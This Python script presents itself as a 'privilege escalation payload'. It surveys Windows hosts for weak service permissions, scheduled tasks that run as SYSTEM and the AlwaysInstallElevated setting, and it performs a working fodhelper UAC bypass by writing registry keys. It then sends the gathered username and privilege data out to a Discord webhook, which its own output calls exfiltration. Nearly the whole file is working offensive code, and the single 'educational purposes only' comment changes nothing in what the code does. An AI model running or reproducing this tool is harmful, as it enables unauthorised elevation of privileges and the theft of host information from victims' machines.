#!/usr/bin/env python3
"""
Privilege Escalation Payload
Techniques for elevating privileges on Windows
"""

import subprocess
import platform
import os
import sys
from pathlib import Path

# Import Discord webhook utilities
sys.path.insert(0, str(Path(__file__).parent))
from webhook_utils import send_to_discord


def check_admin_rights() -> bool:
    """
    Check if running with admin/root privileges
    
    Returns:
        True if admin/root
    """
    try:
        if platform.system() == 'Windows':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False


def enumerate_privileges() -> dict:
    """
    Enumerate current user privileges
    
    Returns:
        Dictionary of privilege information
    """
    info = {}
    
    if platform.system() == 'Windows':
        try:
            # Check whoami /priv
            result = subprocess.run(
                ['whoami', '/priv'],
                capture_output=True,
                text=True
            )
            info['privileges'] = result.stdout
            
            # Check whoami /groups
            result = subprocess.run(
                ['whoami', '/groups'],
                capture_output=True,
                text=True
            )
            info['groups'] = result.stdout
            
            # Check if UAC is enabled
            result = subprocess.run(
                ['reg', 'query', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'EnableLUA'],
                capture_output=True,
                text=True
            )
            info['uac_enabled'] = 'REG_DWORD    0x1' in result.stdout
        
        except Exception as e:
            info['error'] = str(e)
    
    else:
        # Linux/macOS
        try:
            info['uid'] = os.getuid()
            info['gid'] = os.getgid()
            info['groups'] = os.getgroups()
            
            # Check sudo access
            result = subprocess.run(
                ['sudo', '-n', 'true'],
                capture_output=True
            )
            info['sudo_access'] = result.returncode == 0
        
        except Exception as e:
            info['error'] = str(e)
    
    return info


def check_vulnerable_services() -> list:
    """
    Check for services with weak permissions (Windows)
    
    Returns:
        List of potentially vulnerable services
    """
    vulnerable = []
    
    if platform.system() != 'Windows':
        return vulnerable
    
    try:
        # Get list of services
        result = subprocess.run(
            ['sc', 'query', 'state=', 'all'],
            capture_output=True,
            text=True
        )
        
        # Parse service names
        services = []
        for line in result.stdout.split('\n'):
            if 'SERVICE_NAME:' in line:
                service_name = line.split(':')[1].strip()
                services.append(service_name)
        
        # Check permissions on first 10 services (to avoid noise)
        for service in services[:10]:
            try:
                perm_result = subprocess.run(
                    ['sc', 'sdshow', service],
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                
                # Check for weak SDDL strings
                if 'WD' in perm_result.stdout or 'BU' in perm_result.stdout:
                    vulnerable.append(service)
            
            except:
                pass
    
    except Exception as e:
        pass
    
    return vulnerable


def check_scheduled_tasks() -> list:
    """
    Enumerate scheduled tasks for privilege escalation opportunities
    
    Returns:
        List of tasks running as SYSTEM
    """
    system_tasks = []
    
    if platform.system() != 'Windows':
        return system_tasks
    
    try:
        result = subprocess.run(
            ['schtasks', '/query', '/fo', 'CSV', '/v'],
            capture_output=True,
            text=True
        )
        
        lines = result.stdout.split('\n')
        for line in lines:
            if 'SYSTEM' in line:
                # Extract task name (first column)
                parts = line.split(',')
                if len(parts) > 0:
                    task_name = parts[0].strip('"')
                    system_tasks.append(task_name)
    
    except Exception as e:
        pass
    
    return system_tasks


def attempt_uac_bypass() -> bool:
    """
    Attempt UAC bypass via fodhelper (Windows 10+)
    Creates registry key to execute payload with elevated privileges
    
    WARNING: Educational purposes only!
    
    Returns:
        True if bypass successful
    """
    if platform.system() != 'Windows':
        return False
    
    try:
        # Create registry keys for fodhelper bypass
        reg_path = r'Software\Classes\ms-settings\shell\open\command'
        
        # Create the key structure
        subprocess.run(
            ['reg', 'add', f'HKCU\\{reg_path}', '/f'],
            capture_output=True
        )
        
        # Set the command payload (calculator as example)
        subprocess.run(
            ['reg', 'add', f'HKCU\\{reg_path}', '/v', '', '/t', 'REG_SZ', '/d', 'calc.exe', '/f'],
            capture_output=True
        )
        
        # Set DelegateExecute
        subprocess.run(
            ['reg', 'add', f'HKCU\\{reg_path}', '/v', 'DelegateExecute', '/t', 'REG_SZ', '/d', '', '/f'],
            capture_output=True
        )
        
        # Trigger fodhelper
        subprocess.Popen(['fodhelper.exe'])
        
        # Cleanup
        subprocess.run(
            ['reg', 'delete', r'HKCU\Software\Classes\ms-settings', '/f'],
            capture_output=True
        )
        
        return True
    
    except Exception as e:
        return False


def check_always_install_elevated() -> bool:
    """
    Check if AlwaysInstallElevated is enabled (allows MSI to run as SYSTEM)
    
    Returns:
        True if enabled
    """
    if platform.system() != 'Windows':
        return False
    
    try:
        # Check HKCU
        result1 = subprocess.run(
            ['reg', 'query', r'HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer', '/v', 'AlwaysInstallElevated'],
            capture_output=True,
            text=True
        )
        
        # Check HKLM
        result2 = subprocess.run(
            ['reg', 'query', r'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer', '/v', 'AlwaysInstallElevated'],
            capture_output=True,
            text=True
        )
        
        hkcu_enabled = 'REG_DWORD    0x1' in result1.stdout
        hklm_enabled = 'REG_DWORD    0x1' in result2.stdout
        
        return hkcu_enabled and hklm_enabled
    
    except:
        return False


def main():
    """
    Main privilege escalation reconnaissance
    """
    print("=" * 60)
    print("PRIVILEGE ESCALATION PAYLOAD")
    print("=" * 60)
    print()
    
    # Check current privileges
    is_admin = check_admin_rights()
    print(f"🔐 Current Privileges: {'Administrator' if is_admin else 'Standard User'}")
    print()
    
    data = {
        "is_admin": is_admin,
        "platform": platform.system(),
        "username": os.getenv('USERNAME') or os.getenv('USER', 'Unknown')
    }
    
    if not is_admin:
        print("📊 Enumerating Privilege Escalation Vectors...")
        print("-" * 60)
        
        # Enumerate current privileges
        privs = enumerate_privileges()
        data['privileges'] = privs
        
        # Check for vulnerable services
        print("\n🔍 Checking vulnerable services...")
        vuln_services = check_vulnerable_services()
        data['vulnerable_services'] = vuln_services
        if vuln_services:
            print(f"   ✓ Found {len(vuln_services)} potentially vulnerable services")
            for svc in vuln_services[:5]:
                print(f"      - {svc}")
        else:
            print("   - No vulnerable services found")
        
        # Check scheduled tasks
        print("\n📅 Checking scheduled tasks running as SYSTEM...")
        system_tasks = check_scheduled_tasks()
        data['system_tasks'] = len(system_tasks)
        print(f"   ✓ Found {len(system_tasks)} tasks running as SYSTEM")
        
        # Check AlwaysInstallElevated
        print("\n🔧 Checking AlwaysInstallElevated...")
        always_elevated = check_always_install_elevated()
        data['always_install_elevated'] = always_elevated
        if always_elevated:
            print("   ✓ AlwaysInstallElevated is ENABLED (Privilege escalation possible!)")
        else:
            print("   - AlwaysInstallElevated is disabled")
        
        # Check UAC status
        if platform.system() == 'Windows':
            print("\n🛡️  UAC Status:")
            uac_enabled = privs.get('uac_enabled', True)
            data['uac_enabled'] = uac_enabled
            print(f"   UAC: {'Enabled' if uac_enabled else 'Disabled'}")
    
    else:
        print("✓ Already running with administrator privileges!")
        data['message'] = "Already admin - no escalation needed"
    
    # Send to Discord
    print("\n📤 Exfiltrating privilege escalation data...")
    if send_to_discord("⬆️ Privilege Escalation Reconnaissance", data):
        print("✓ Data sent to Discord successfully!")
    else:
        print("✗ Failed to send to Discord")
    
    print("\n" + "=" * 60)


if __name__ == '__main__':
    main()
